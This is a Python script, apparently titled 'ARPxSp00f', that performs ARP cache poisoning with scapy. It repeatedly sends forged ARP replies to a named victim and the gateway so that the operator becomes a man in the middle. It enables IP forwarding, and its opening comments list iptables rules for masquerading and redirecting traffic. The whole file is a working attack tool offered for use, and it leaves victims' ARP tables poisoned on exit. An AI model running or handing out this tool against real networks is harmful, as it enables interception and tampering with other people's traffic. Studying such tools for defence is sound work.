#!/usr/bin/python

#Forward traffic for this to work
# echo "1" > /proc/sys/net/ipv4/ip_forward
# sudo sysctl net.ipv4.ip_forward=1 (Same thing)
# sudo iptables -t nat -A POSTROUTING -j MASQUERADE

#Specific Ports
# iptables -t nat -A PREROUTING -p tcp --dport 1111 -j DNAT --to-destination 2.2.2.2:1111
# iptables -t nat -A PREROUTING -s 192.168.1.5 -j DNAT --to-destination 192.168.1.1
from scapy.all import *  
import sys, signal
import argparse
import os


if os.geteuid() != 0:
	exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

parser = argparse.ArgumentParser(description='ARPxSp00f. Spoof packets to the target and gateway to MITM.')
parser.add_argument('--victim-ip', dest='vip', help='Target IP Address', required=True)
parser.add_argument('--victim-mac', dest='vmac', help='Target IP MAC Address', required=True)
parser.add_argument('--local-ip', dest='lip', help='Local IP', required=True)
parser.add_argument('--local-mac', dest='lmac', help='Local MAC Address', required=True)
parser.add_argument('--gateway-ip', dest='gip', help='Gateway IP', required=True)
parser.add_argument('--gateway-mac', dest='gmac', help='Gateway MAC Address', required=True)
parser.add_argument('--interface', dest='iface', help='Desired Interface', required=True)
args = parser.parse_args()

print("Enabling forwarding..")
os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
os.system("sysctl net.ipv4.ip_forward=1")

def main():
	x = 1
	conf.verb = 0
	conf.iface=args.iface

	while (x):
		vpoison = (Ether(src=args.lmac,dst=args.vmac)/ARP(op=2,psrc=args.gip,pdst=args.vip,hwsrc=args.lmac,hwdst=args.vmac))
		gpoison = (Ether(src=args.lmac,dst=args.gmac)/ARP(op=2,psrc=args.vip,pdst=args.gip,hwsrc=args.lmac,hwdst=args.gmac))
		sendp(vpoison)
		sendp(gpoison)
		time.sleep(5)
		print(vpoison.sprintf(r"Destination:%Ether.dst% Source:%Ether.src% ARP Source: %ARP.psrc% Destination:%ARP.pdst% HSRC:%ARP.hwsrc% HDSt:%ARP.hwdst%"))
		print(gpoison.sprintf(r"Destination:%Ether.dst% Source:%Ether.src% ARP Source: %ARP.psrc% Destination:%ARP.pdst% HSRC:%ARP.hwsrc% HDSt:%ARP.hwdst%"))
		signal.signal(signal.SIGINT, signal_handler)

def signal_handler(signal, frame):
	print("Exiting...not cleaning up, we really should clean up arp tables")
	sys.exit(0)

main()